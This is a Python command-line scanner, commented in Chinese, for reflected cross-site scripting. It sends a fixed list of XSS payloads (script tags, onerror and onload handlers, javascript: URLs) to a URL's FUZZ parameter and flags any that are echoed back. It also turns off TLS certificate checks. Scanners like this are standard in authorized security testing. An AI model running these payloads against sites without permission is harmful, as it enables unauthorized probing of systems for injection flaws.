#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""反射 XSS 检测器: 注入 payload 检测回显/事件触发特征
用法:
  python xss_detector.py -u "http://target.com/search?q=FUZZ"
  python xss_detector.py -f endpoints.txt --param q
"""
import argparse, html as htmllib, re, ssl, sys, urllib.request, urllib.error, urllib.parse

PAYLOADS = [
    ("<script>alert(1)</script>", r"<script>alert\(1\)</script>"),
    ('"><script>alert(1)</script>', r"<script>alert\(1\)</script>"),
    ("'><img src=x onerror=alert(1)>", r"onerror"),
    ('"><img src=x onerror=alert(1)>', r"onerror"),
    ("javascript:alert(1)", r"javascript:"),
    ("'-alert(1)-'", r"-alert\(1\)-"),
    ("<svg/onload=alert(1)>", r"onload.*alert"),
    ("<body onload=alert(1)>", r"onload.*alert"),
]

def probe(url, payload, timeout=8):
    u = url.replace("FUZZ", urllib.parse.quote(payload))
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(u, headers={"User-Agent": "Mozilla/5.0"})
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read().decode("utf-8", "ignore")
            return r.status, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "ignore")
        return e.code, body
    except Exception:
        return None, ""

def main():
    ap = argparse.ArgumentParser(description="反射 XSS 检测器")
    ap.add_argument("-u", "--url", help="单 URL,用 FUZZ 标记注入点")
    ap.add_argument("-f", "--file", help="URL 列表文件")
    ap.add_argument("--param", help="参数名(若 URL 无 FUZZ 标记)")
    args = ap.parse_args()
    if not args.url and not args.file:
        ap.print_help(); sys.exit(1)

    urls = []
    if args.url:
        urls = [args.url]
    if args.file:
        with open(args.file, encoding="utf-8") as f:
            urls.extend(l.strip() for l in f if l.strip())

    for url in urls:
        if "FUZZ" not in url and args.param:
            sep = "&" if "?" in url else "?"
            url = f"{url}{sep}{args.param}=FUZZ"
        print(f"\n[*] {url}")
        for payload, detect in PAYLOADS:
            code, body = probe(url, payload)
            if code and re.search(detect, body):
                print(f"  [!] XSS: {payload[:50]} -> 回显")

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: sys.exit(130)
